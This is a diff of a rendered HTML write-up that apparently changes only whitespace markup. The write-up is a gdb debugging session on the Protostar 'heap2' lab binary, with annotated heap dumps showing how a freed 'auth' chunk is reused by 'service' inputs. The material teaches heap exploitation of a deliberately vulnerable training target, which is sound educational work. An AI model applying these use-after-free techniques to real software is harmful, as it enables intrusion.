+0x08048a80<span class="w"> </span>&lt;main+332&gt;:<span class="w">  </span>jne<span class="w">    </span>0x8048942<span class="w"> </span>&lt;main+14&gt;
+0x08048a86<span class="w"> </span>&lt;main+338&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,ds:0x804b5f4
+0x08048a8b<span class="w"> </span>&lt;main+343&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax+0x20<span class="o">]</span>
+0x08048a8e<span class="w"> </span>&lt;main+346&gt;:<span class="w">  </span><span class="nb">test</span><span class="w">   </span>eax,eax
+0x08048a90<span class="w"> </span>&lt;main+348&gt;:<span class="w">  </span>je<span class="w">     </span>0x8048aa3<span class="w"> </span>&lt;main+367&gt;
+0x08048a92<span class="w"> </span>&lt;main+350&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x804ada7
+0x08048a99<span class="w"> </span>&lt;main+357&gt;:<span class="w">  </span>call<span class="w">   </span>0x804883c<span class="w"> </span>&lt;puts@plt&gt;
+0x08048a9e<span class="w"> </span>&lt;main+362&gt;:<span class="w">  </span>jmp<span class="w">    </span>0x8048943<span class="w"> </span>&lt;main+15&gt;
+0x08048aa3<span class="w"> </span>&lt;main+367&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x804adc3
+0x08048aaa<span class="w"> </span>&lt;main+374&gt;:<span class="w">  </span>call<span class="w">   </span>0x804883c<span class="w"> </span>&lt;puts@plt&gt;
+0x08048aaf<span class="w"> </span>&lt;main+379&gt;:<span class="w">  </span>jmp<span class="w">    </span>0x8048943<span class="w"> </span>&lt;main+15&gt;
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
 </code></pre></div>
 </details>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> r
-Starting program: /opt/protostar/bin/heap2 
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-auth admin
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/heap2<span class="w"> </span>
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span>,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+auth<span class="w"> </span>admin
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
 ^C
-Program received signal SIGINT, Interrupt.
-0xb7f53c1e <span class="k">in</span> __read_nocancel <span class="o">()</span> at ../sysdeps/unix/syscall-template.S:82
-<span class="m">82</span>  ../sysdeps/unix/syscall-template.S: No such file or directory.
-  <span class="k">in</span> ../sysdeps/unix/syscall-template.S
-Current language:  auto
-The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently asm&quot;</span>.
-<span class="o">(</span>gdb<span class="o">)</span> info proc mappings
-process <span class="m">7281</span>
-<span class="nv">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/heap2&#39;</span>
-<span class="nv">cwd</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin&#39;</span>
-<span class="nv">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/heap2&#39;</span>
-Mapped address spaces:
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGINT,<span class="w"> </span>Interrupt.
+0xb7f53c1e<span class="w"> </span><span class="k">in</span><span class="w"> </span>__read_nocancel<span class="w"> </span><span class="o">()</span><span class="w"> </span>at<span class="w"> </span>../sysdeps/unix/syscall-template.S:82
+<span class="m">82</span><span class="w">  </span>../sysdeps/unix/syscall-template.S:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory.
+<span class="w">  </span><span class="k">in</span><span class="w"> </span>../sysdeps/unix/syscall-template.S
+Current<span class="w"> </span>language:<span class="w">  </span>auto
+The<span class="w"> </span>current<span class="w"> </span><span class="nb">source</span><span class="w"> </span>language<span class="w"> </span>is<span class="w"> </span><span class="s2">&quot;auto; currently asm&quot;</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>proc<span class="w"> </span>mappings
+process<span class="w"> </span><span class="m">7281</span>
+<span class="nv">cmdline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin/heap2&#39;</span>
+<span class="nv">cwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin&#39;</span>
+<span class="nv">exe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin/heap2&#39;</span>
+Mapped<span class="w"> </span>address<span class="w"> </span>spaces:
 
-  Start Addr   End Addr       Size     Offset objfile
-  0x8048000  0x804b000     0x3000          <span class="m">0</span>        /opt/protostar/bin/heap2
-  0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap2
-  0x804c000  0x804d000     0x1000          <span class="m">0</span>           <span class="o">[</span>heap<span class="o">]</span>
-  0xb7e96000 0xb7e97000     0x1000          <span class="m">0</span>        
-  0xb7e97000 0xb7fd5000   0x13e000          <span class="m">0</span>         /lib/libc-2.11.2.so
-  0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
-  0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
-  0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
-  0xb7fd9000 0xb7fdc000     0x3000          <span class="m">0</span>        
-  0xb7fde000 0xb7fe2000     0x4000          <span class="m">0</span>        
-  0xb7fe2000 0xb7fe3000     0x1000          <span class="m">0</span>           <span class="o">[</span>vdso<span class="o">]</span>
-  0xb7fe3000 0xb7ffe000    0x1b000          <span class="m">0</span>         /lib/ld-2.11.2.so
-  0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
-  0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
-  0xbffeb000 0xc0000000    0x15000          <span class="m">0</span>           <span class="o">[</span>stack<span class="o">]</span>
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x0804895f <span class="c1"># call   0x804881c &lt;printf@plt&gt;</span>
-Breakpoint <span class="m">1</span> at 0x804895f: file heap2/heap2.c, line <span class="m">20</span>.
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">command</span>  <span class="c1"># define what gdb commands shall be executed when the breakpoint is hit</span>
-Type commands <span class="k">for</span> when breakpoint <span class="m">1</span> is hit, one per line.
-End with a line saying just <span class="s2">&quot;end&quot;</span>.
-&gt;echo -------------------------------------------------<span class="se">\n</span>
-&gt;x/20wx 0x804c000 <span class="c1"># print the heap</span>
-&gt;echo --------auth-------------------------------------<span class="se">\n</span>
-&gt;print *auth
-&gt;echo --------service----------------------------------<span class="se">\n</span>
-&gt;print service
-&gt;echo -------------------------------------------------<span class="se">\n</span>
+<span class="w">  </span>Start<span class="w"> </span>Addr<span class="w">   </span>End<span class="w"> </span>Addr<span class="w">       </span>Size<span class="w">     </span>Offset<span class="w"> </span>objfile
+<span class="w">  </span>0x8048000<span class="w">  </span>0x804b000<span class="w">     </span>0x3000<span class="w">          </span><span class="m">0</span><span class="w">        </span>/opt/protostar/bin/heap2
+<span class="w">  </span>0x804b000<span class="w">  </span>0x804c000<span class="w">     </span>0x1000<span class="w">     </span>0x3000<span class="w">        </span>/opt/protostar/bin/heap2
+<span class="w">  </span>0x804c000<span class="w">  </span>0x804d000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">           </span><span class="o">[</span>heap<span class="o">]</span>
+<span class="w">  </span>0xb7e96000<span class="w"> </span>0xb7e97000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7e97000<span class="w"> </span>0xb7fd5000<span class="w">   </span>0x13e000<span class="w">          </span><span class="m">0</span><span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd5000<span class="w"> </span>0xb7fd6000<span class="w">     </span>0x1000<span class="w">   </span>0x13e000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd6000<span class="w"> </span>0xb7fd8000<span class="w">     </span>0x2000<span class="w">   </span>0x13e000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd8000<span class="w"> </span>0xb7fd9000<span class="w">     </span>0x1000<span class="w">   </span>0x140000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd9000<span class="w"> </span>0xb7fdc000<span class="w">     </span>0x3000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7fde000<span class="w"> </span>0xb7fe2000<span class="w">     </span>0x4000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7fe2000<span class="w"> </span>0xb7fe3000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">           </span><span class="o">[</span>vdso<span class="o">]</span>
+<span class="w">  </span>0xb7fe3000<span class="w"> </span>0xb7ffe000<span class="w">    </span>0x1b000<span class="w">          </span><span class="m">0</span><span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xb7ffe000<span class="w"> </span>0xb7fff000<span class="w">     </span>0x1000<span class="w">    </span>0x1a000<span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xb7fff000<span class="w"> </span>0xb8000000<span class="w">     </span>0x1000<span class="w">    </span>0x1b000<span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xbffeb000<span class="w"> </span>0xc0000000<span class="w">    </span>0x15000<span class="w">          </span><span class="m">0</span><span class="w">           </span><span class="o">[</span>stack<span class="o">]</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x0804895f<span class="w"> </span><span class="c1"># call   0x804881c &lt;printf@plt&gt;</span>
+Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x804895f:<span class="w"> </span>file<span class="w"> </span>heap2/heap2.c,<span class="w"> </span>line<span class="w"> </span><span class="m">20</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">command</span><span class="w">  </span><span class="c1"># define what gdb commands shall be executed when the breakpoint is hit</span>
+Type<span class="w"> </span>commands<span class="w"> </span><span class="k">for</span><span class="w"> </span>when<span class="w"> </span>breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>is<span class="w"> </span>hit,<span class="w"> </span>one<span class="w"> </span>per<span class="w"> </span>line.
+End<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>line<span class="w"> </span>saying<span class="w"> </span>just<span class="w"> </span><span class="s2">&quot;end&quot;</span>.
+&gt;echo<span class="w"> </span>-------------------------------------------------<span class="se">\n</span>
+&gt;x/20wx<span class="w"> </span>0x804c000<span class="w"> </span><span class="c1"># print the heap</span>
+&gt;echo<span class="w"> </span>--------auth-------------------------------------<span class="se">\n</span>
+&gt;print<span class="w"> </span>*auth
+&gt;echo<span class="w"> </span>--------service----------------------------------<span class="se">\n</span>
+&gt;print<span class="w"> </span>service
+&gt;echo<span class="w"> </span>-------------------------------------------------<span class="se">\n</span>
 &gt;continue
 &gt;end
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> r
-Starting program: /opt/protostar/bin/heap2 
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/heap2<span class="w"> </span>
 
-Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
-<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
-Current language:  auto
-The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently c&quot;</span>.
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x0804895f<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap2/heap2.c:20
+<span class="m">20</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap2/heap2.c
+Current<span class="w"> </span>language:<span class="w">  </span>auto
+The<span class="w"> </span>current<span class="w"> </span><span class="nb">source</span><span class="w"> </span>language<span class="w"> </span>is<span class="w"> </span><span class="s2">&quot;auto; currently c&quot;</span>.
 -------------------------------------------------
-0x804c000:  Cannot access memory at address 0x804c000
-<span class="o">(</span>gdb<span class="o">)</span> c
+0x804c000:<span class="w">  </span>Cannot<span class="w"> </span>access<span class="w"> </span>memory<span class="w"> </span>at<span class="w"> </span>address<span class="w"> </span>0x804c000
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-auth admin
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span>,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+auth<span class="w"> </span>admin
 
-Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
-<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x0804895f<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap2/heap2.c:20
+<span class="m">20</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap2/heap2.c
 -------------------------------------------------
-0x804c000:  0x00000000  0x00000011  0x696d6461  0x00000a6e
+0x804c000:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000011<span class="w">  </span>0x696d6461<span class="w">  </span>0x00000a6e
 <span class="c1"># 实际上 sizeof(auth) 返回的是指针 auth 的大小（4 bytes）而不是结构体 auth</span>
 <span class="c1"># 考虑到对齐，所以这里只分配了 8 字节（8 bytes header + 8 bytes data）</span>
-0x804c010:  0x00000000  0x00000ff1  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c010:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000ff1<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c020:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c030:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c040:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
 --------auth-------------------------------------
-<span class="nv">$5</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot;admin\n\000\000\000\000\000\000\361\017&quot;</span>, <span class="s1">&#39;\000&#39;</span> &lt;repeats <span class="m">17</span> times&gt;, <span class="nv">auth</span> <span class="o">=</span> <span class="m">0</span><span class="o">}</span>
+<span class="nv">$5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;admin\n\000\000\000\000\000\000\361\017&quot;</span>,<span class="w"> </span><span class="s1">&#39;\000&#39;</span><span class="w"> </span>&lt;repeats<span class="w"> </span><span class="m">17</span><span class="w"> </span>times&gt;,<span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="o">}</span>
 --------service----------------------------------
-<span class="nv">$6</span> <span class="o">=</span> 0x0
+<span class="nv">$6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x0
 -------------------------------------------------
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
 reset
 
-Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
-<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x0804895f<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap2/heap2.c:20
+<span class="m">20</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap2/heap2.c
 -------------------------------------------------
 <span class="c1"># the first word of the chunk data got replaced with 0</span>
 <span class="c1"># because the first word in a free chunk is defined as the previous free chunk address</span>
 <span class="c1"># free chunks 是链表，因为没有其它 free chunk，所以为空</span>
-0x804c000:  0x00000000  0x00000011  0x00000000  0x00000a6e
-0x804c010:  0x00000000  0x00000ff1  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c000:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000011<span class="w">  </span>0x00000000<span class="w">  </span>0x00000a6e
+0x804c010:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000ff1<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c020:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c030:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c040:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
 --------auth-------------------------------------
-<span class="nv">$7</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot;\000\000\000\000n\n\000\000\000\000\000\000\361\017&quot;</span>, <span class="s1">&#39;\000&#39;</span> &lt;repeats <span class="m">17</span> times&gt;, <span class="nv">auth</span> <span class="o">=</span> <span class="m">0</span><span class="o">}</span>
+<span class="nv">$7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;\000\000\000\000n\n\000\000\000\000\000\000\361\017&quot;</span>,<span class="w"> </span><span class="s1">&#39;\000&#39;</span><span class="w"> </span>&lt;repeats<span class="w"> </span><span class="m">17</span><span class="w"> </span>times&gt;,<span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="o">}</span>
 --------service----------------------------------
-<span class="nv">$8</span> <span class="o">=</span> 0x0
+<span class="nv">$8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x0
 -------------------------------------------------
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-service AAA
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+service<span class="w"> </span>AAA
 
-Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
-<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x0804895f<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap2/heap2.c:20
+<span class="m">20</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap2/heap2.c
 -------------------------------------------------
-0x804c000:  0x00000000  0x00000011  0x41414120  0x0000000a
-0x804c010:  0x00000000  0x00000ff1  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c000:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000011<span class="w">  </span>0x41414120<span class="w">  </span>0x0000000a
+0x804c010:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000ff1<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c020:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c030:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c040:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
 --------auth-------------------------------------
-<span class="nv">$9</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot; AAA\n\000\000\000\000\000\000\000\361\017&quot;</span>, <span class="s1">&#39;\000&#39;</span> &lt;repeats <span class="m">17</span> times&gt;, <span class="nv">auth</span> <span class="o">=</span> <span class="m">0</span><span class="o">}</span>
+<span class="nv">$9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot; AAA\n\000\000\000\000\000\000\000\361\017&quot;</span>,<span class="w"> </span><span class="s1">&#39;\000&#39;</span><span class="w"> </span>&lt;repeats<span class="w"> </span><span class="m">17</span><span class="w"> </span>times&gt;,<span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="o">}</span>
 --------service----------------------------------
-<span class="nv">$10</span> <span class="o">=</span> 0x804c008 <span class="s2">&quot; AAA\n&quot;</span>
+<span class="nv">$10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008<span class="w"> </span><span class="s2">&quot; AAA\n&quot;</span>
 -------------------------------------------------
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c008 <span class="o">]</span>
-service BBB
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008<span class="w"> </span><span class="o">]</span>
+service<span class="w"> </span>BBB
 
-Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
-<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x0804895f<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap2/heap2.c:20
+<span class="m">20</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap2/heap2.c
 -------------------------------------------------
-0x804c000:  0x00000000  0x00000011  0x41414120  0x0000000a
-0x804c010:  0x00000000  0x00000011  0x42424220  0x0000000a
-0x804c020:  0x00000000  0x00000fe1  0x00000000  0x00000000
-0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c000:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000011<span class="w">  </span>0x41414120<span class="w">  </span>0x0000000a
+0x804c010:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000011<span class="w">  </span>0x42424220<span class="w">  </span>0x0000000a
+0x804c020:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000fe1<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c030:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c040:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
 --------auth-------------------------------------
-<span class="nv">$11</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot; AAA\n\000\000\000\000\000\000\000\021\000\000\000 BBB\n\000\000\000\000\000\000\000\341\017\000&quot;</span>, <span class="nv">auth</span> <span class="o">=</span> <span class="m">0</span><span class="o">}</span>
+<span class="nv">$11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot; AAA\n\000\000\000\000\000\000\000\021\000\000\000 BBB\n\000\000\000\000\000\000\000\341\017\000&quot;</span>,<span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="o">}</span>
 --------service----------------------------------
-<span class="nv">$12</span> <span class="o">=</span> 0x804c018 <span class="s2">&quot; BBB\n&quot;</span>
+<span class="nv">$12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c018<span class="w"> </span><span class="s2">&quot; BBB\n&quot;</span>
 -------------------------------------------------
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c018 <span class="o">]</span>
-service CCC
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c018<span class="w"> </span><span class="o">]</span>
+service<span class="w"> </span>CCC
 
-Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
-<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
